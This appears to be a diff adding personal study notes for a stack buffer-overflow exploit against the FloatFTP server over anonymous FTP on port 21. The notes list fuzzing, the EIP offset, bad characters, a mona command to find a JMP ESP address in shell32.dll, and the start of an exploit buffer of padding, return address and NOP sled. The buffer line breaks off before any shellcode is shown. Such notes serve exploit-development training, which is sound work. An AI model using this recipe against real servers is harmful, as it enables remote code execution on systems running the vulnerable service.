@@ -1,0 +1,14 @@
+Service  ="FloatFTP" 
+PORT = 21 /FTP (Anynoymous login)
+
+
+1.Fuzzing and findinf bugger size 500
+2. find offset via sending random string of 500
+
+ EIP= > 33694132  buffer size 248
+
+3. bad character => "\x00\x0a\x0d" 
+
+4.  return addrress !mona find -s "\xff\xe4" -m shell32.dll
+
+5. Exploit Shellcode = "A" * 248 + "\x21\x4b\x0b\x76" + "\x90" *32 +exploi
